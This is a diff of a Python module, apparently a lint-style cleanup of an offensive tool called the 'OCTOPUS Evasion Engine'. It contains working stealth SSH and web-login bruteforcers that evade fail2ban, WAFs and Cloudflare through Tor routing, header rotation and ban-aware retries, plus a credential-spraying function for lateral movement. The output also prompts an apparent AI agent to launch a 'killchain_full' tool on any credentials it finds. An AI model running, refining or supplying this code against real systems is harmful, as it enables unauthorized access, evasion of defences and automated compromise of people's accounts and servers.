@@ -23,16 +23,12 @@ Web Evasion Strategy:
   6. Detect and handle Cloudflare challenges
 """
 
-import os
 import logging
-import re
-import sys
-import time
+import os
 import random
 import socket
-import hashlib
-import threading
-import subprocess
+import time
+from typing import Optional
 
 try:
     import paramiko
@@ -71,9 +67,7 @@ C_BLUE   = "\033[94m"
 C_MAGENTA = "\033[95m"
 C_RESET  = "\033[0m"
 
-# ═══════════════════════════════════════════════
 # USER-AGENT ROTATION POOL (real browser strings)
-# ═══════════════════════════════════════════════
 
 _USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -103,9 +97,7 @@ _SSH_BANNERS = [
 ]
 
 
-# ═══════════════════════════════════════════════
 # PROXY / TOR MANAGEMENT
-# ═══════════════════════════════════════════════
 
 def _check_tor_running() -> bool:
     """Check if TOR SOCKS proxy is available on port 9050."""
@@ -115,7 +107,7 @@ def _check_tor_running() -> bool:
         result = s.connect_ex(("127.0.0.1", 9050))
         s.close()
         return result == 0
-    except Exception as e:
+    except Exception:
         return False
 
 
@@ -157,12 +149,10 @@ def _create_proxy_socket(host, port, proxy_type="socks5", proxy_host="127.0.0.1"
         return s
 
 
-# ═══════════════════════════════════════════════
 # SSH BRUTEFORCE — PARAMIKO-BASED (fail2ban bypass)
-# ═══════════════════════════════════════════════
 
-def ssh_bruteforce_stealth(target: str, port: int = 22, users: list = None,
-                           passwords: list = None, password_files: list = None,
+def ssh_bruteforce_stealth(target: str, port: int = 22, users: Optional[list] = None,
+                           passwords: Optional[list] = None, password_files: Optional[list] = None,
                            use_tor: bool = False, max_attempts_per_conn: int = 3,
                            base_delay: float = 2.0, jitter: float = 1.5,
                            ban_wait: int = 300, max_ban_retries: int = 10,
@@ -222,7 +212,7 @@ def ssh_bruteforce_stealth(target: str, port: int = 22, users: list = None,
             if not os.path.isfile(fpath):
                 continue
             try:
-                with open(fpath, "r", errors="ignore") as f:
+                with open(fpath, errors="ignore") as f:
                     for line in f:
                         word = line.strip()
                         if not word or word.startswith('#'):
@@ -236,7 +226,7 @@ def ssh_bruteforce_stealth(target: str, port: int = 22, users: list = None,
                             pwd_list.append(word)
                             if len(pwd_list) >= max_passwords:
                                 break
-            except Exception as e:
+            except Exception:
                 continue
             if len(pwd_list) >= max_passwords:
                 break
@@ -273,7 +263,7 @@ def ssh_bruteforce_stealth(target: str, port: int = 22, users: list = None,
     else:
         output += "Routing: DIRECT\n"
 
-    print(f"  {C_CYAN}[*] {len(pwd_list):,} passwords × {len(users)} users = {total_combos:,} combos{C_RESET}")
+    print(f"  {C_CYAN}[*] {len(pwd_list):,} passwords x {len(users)} users = {total_combos:,} combos{C_RESET}")
     print(f"  {C_CYAN}[*] ~{max_attempts_per_conn} attempts/connection, {base_delay}s±{jitter}s delay{C_RESET}")
     print(f"  {C_CYAN}[*] Ban wait: {ban_wait}s, max ban retries: {max_ban_retries}{C_RESET}")
 
@@ -298,7 +288,6 @@ def ssh_bruteforce_stealth(target: str, port: int = 22, users: list = None,
         banner = random.choice(_SSH_BANNERS)
         transport = None
         attempts_this_conn = 0
-        conn_had_error = False  # Track if this connection ended in error
 
         try:
             # Create socket (direct or via TOR)
@@ -362,20 +351,15 @@ def ssh_bruteforce_stealth(target: str, port: int = 22, users: list = None,
                     if "too many" in err_str or "not allowed" in err_str:
                         # Server kicked us — max auth attempts reached
                         # This attempt MAY not have been evaluated; DON'T advance idx
-                        conn_had_error = True
                         break
                     elif "no authentication" in err_str:
-                        conn_had_error = True
                         break
                     else:
-                        conn_had_error = True
                         break
                 except EOFError:
                     # Transport died mid-auth — this attempt was NOT evaluated
-                    conn_had_error = True
                     break
-                except Exception as e:
-                    conn_had_error = True
+                except Exception:
                     break
 
                 # ── Random delay between attempts ────────────
@@ -383,11 +367,10 @@ def ssh_bruteforce_stealth(target: str, port: int = 22, users: list = None,
                 delay = max(0.5, delay)  # never less than 0.5s
                 time.sleep(delay)
 
-        except (ConnectionRefusedError, OSError, socket.timeout) as e:
+        except (ConnectionRefusedError, OSError, socket.timeout):
             # ── BAN DETECTED ─────────────────────────────────
             ban_count += 1
             consecutive_bans += 1
-            conn_had_error = True
             elapsed = int(time.time() - start_time)
 
             # CRITICAL: Roll back idx to retry ALL attempts from this connection
@@ -440,15 +423,13 @@ def ssh_bruteforce_stealth(target: str, port: int = 22, users: list = None,
                 if remaining > 30:
                     print(f"  {C_GREY}    ... {remaining - 30}s remaining{C_RESET}")
 
-        except paramiko.SSHException as e:
+        except paramiko.SSHException:
             # Protocol error — roll back and retry
-            conn_had_error = True
             if idx > idx_at_conn_start:
                 idx = idx_at_conn_start
             time.sleep(3 + random.uniform(0, 2))
 
-        except Exception as e:
-            conn_had_error = True
+        except Exception:
             if idx > idx_at_conn_start:
                 idx = idx_at_conn_start
             time.sleep(2)
@@ -473,7 +454,7 @@ def ssh_bruteforce_stealth(target: str, port: int = 22, users: list = None,
 def _format_brute_summary(found_creds, attempts, connections, elapsed, bans):
     """Format bruteforce result summary."""
     out = f"\n{'═' * 60}\n"
-    out += f"STEALTH BRUTE COMPLETE\n"
+    out += "STEALTH BRUTE COMPLETE\n"
     out += f"  Attempts: {attempts:,}\n"
     out += f"  Connections: {connections:,}\n"
     out += f"  Bans detected: {bans}\n"
@@ -484,10 +465,10 @@ def _format_brute_summary(found_creds, attempts, connections, elapsed, bans):
         out += f"\n  [+] CREDENTIALS FOUND ({len(found_creds)}):\n"
         for user, pwd in found_creds:
             out += f"      {user}:{pwd}\n"
-        out += f"\nAI: Credentials found! Run kill chain:\n"
+        out += "\nAI: Credentials found! Run kill chain:\n"
         out += f"[TOOL: killchain_full TARGET {found_creds[0][0]} {found_creds[0][1]}]\n"
     else:
-        out += f"\n  [-] No credentials found.\n"
+        out += "\n  [-] No credentials found.\n"
 
     return out
 
@@ -503,9 +484,7 @@ def _fmt_time(secs: int) -> str:
         return f"{h}h{m:02d}m"
 
 
-# ═══════════════════════════════════════════════
 # WEB EVASION ENGINE
-# ═══════════════════════════════════════════════
 
 class WebEvasionSession:
     """
@@ -555,7 +534,7 @@ class WebEvasionSession:
         import urllib3
         urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-    def _get_headers(self, url: str = "", extra_headers: dict = None) -> dict:
+    def _get_headers(self, url: str = "", extra_headers: Optional[dict] = None) -> dict:
         """Generate evasive request headers."""
         headers = {
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
@@ -669,18 +648,16 @@ class WebEvasionSession:
 
     def _is_cloudflare_challenge(self, resp) -> bool:
         """Detect Cloudflare challenge/block pages."""
-        if resp.status_code == 403:
-            cf_headers = ["cf-ray", "cf-cache-status", "cf-request-id"]
-            if any(h in resp.headers for h in cf_headers):
-                return True
-        if resp.status_code == 503:
-            if "cloudflare" in resp.text.lower() or "cf-" in str(resp.headers).lower():
-                return True
+        cf_headers = ["cf-ray", "cf-cache-status", "cf-request-id"]
+        if resp.status_code == 403 and any(h in resp.headers for h in cf_headers):
+            return True
+        if resp.status_code == 503 and (
+            "cloudflare" in resp.text.lower() or "cf-" in str(resp.headers).lower()
+        ):
+            return True
         if "checking your browser" in resp.text.lower():
             return True
-        if resp.status_code == 429:  # Rate limited
-            return True
-        return False
+        return resp.status_code == 429  # Rate limited
 
     def detect_waf(self, url: str) -> dict:
         """Detect WAF type and characteristics."""
@@ -738,13 +715,11 @@ class WebEvasionSession:
         return result
 
 
-# ═══════════════════════════════════════════════
 # WEB LOGIN BRUTEFORCE WITH EVASION
-# ═══════════════════════════════════════════════
 
-def web_bruteforce_stealth(url: str, users: list = None, passwords: list = None,
-                           password_files: list = None, use_tor: bool = False,
-                           form_data: dict = None) -> str:
+def web_bruteforce_stealth(url: str, users: Optional[list] = None, passwords: Optional[list] = None,
+                           password_files: Optional[list] = None, use_tor: bool = False,
+                           form_data: Optional[dict] = None) -> str:
     """
     Stealth web login bruteforce with WAF/rate-limit evasion.
 
@@ -771,7 +746,7 @@ def web_bruteforce_stealth(url: str, users: list = None, passwords: list = None,
         seen = set()
         for fpath in password_files:
             try:
-                with open(fpath, "r", errors="ignore") as f:
+                with open(fpath, errors="ignore") as f:
                     for line in f:
                         word = line.strip()
                         if word and word not in seen and not word.startswith('#'):
@@ -779,7 +754,7 @@ def web_bruteforce_stealth(url: str, users: list = None, passwords: list = None,
                             passwords.append(word)
                             if len(passwords) >= 5000:
                                 break
-            except Exception as e:
+            except Exception:
                 continue
 
     # ── Detect login form ────────────────────────────────────
@@ -848,7 +823,7 @@ def web_bruteforce_stealth(url: str, users: list = None, passwords: list = None,
     attempt = 0
     total = len(users) * len(passwords)
 
-    print(f"  {C_CYAN}[*] {len(passwords)} passwords × {len(users)} users = {total} combos{C_RESET}")
+    print(f"  {C_CYAN}[*] {len(passwords)} passwords x {len(users)} users = {total} combos{C_RESET}")
 
     for pwd in passwords:
         for user_val in users:
@@ -908,17 +883,15 @@ def web_bruteforce_stealth(url: str, users: list = None, passwords: list = None,
     if found_creds:
         output += f"[+] Found {len(found_creds)} valid credential(s)\n"
     else:
-        output += f"[-] No valid credentials found\n"
+        output += "[-] No valid credentials found\n"
 
     return output
 
 
-# ═══════════════════════════════════════════════
 # PORT-AGNOSTIC SERVICE BRUTEFORCE
-# ═══════════════════════════════════════════════
 
-def service_bruteforce_stealth(service: str, target: str, port: int = None,
-                               users: list = None, password_files: list = None,
+def service_bruteforce_stealth(service: str, target: str, port: Optional[int] = None,
+                               users: Optional[list] = None, password_files: Optional[list] = None,
                                use_tor: bool = False) -> str:
     """
     Universal service bruteforce dispatcher.
@@ -947,13 +920,9 @@ def service_bruteforce_stealth(service: str, target: str, port: int = None,
         return None  # Caller should use original hydra bruteforce
 
 
-# ═══════════════════════════════════════════════
-# v7.0: CREDENTIAL SPRAYING (LATERAL MOVEMENT)
-# ═══════════════════════════════════════════════
-
 def credential_spray(targets: list, creds: list, service: str = "ssh", delay: float = 2.0) -> list:
     """
-    v7.0: Perform credential spraying for lateral movement.
+    Perform credential spraying for lateral movement.
     Tries each credential against ALL targets before moving to the next credential.
     This prevents locking out accounts by spacing out attempts on the same host.
     
@@ -1012,7 +981,7 @@ def credential_spray(targets: list, creds: list, service: str = "ssh", delay: fl
                     transport.close()
             except paramiko.AuthenticationException:
                 pass  # Failed auth, expected
-            except Exception as e:
+            except Exception:
                 pass  # Connection refused, timeout, etc.
             finally:
                 try:
@@ -1032,9 +1001,7 @@ def credential_spray(targets: list, creds: list, service: str = "ssh", delay: fl
 
 
 
-# ═══════════════════════════════════════════════
 # QUICK TEST
-# ═══════════════════════════════════════════════
 
 if __name__ == "__main__":
     print(f"{C_RED}OCTOPUS Evasion Engine v4.1{C_RESET}")
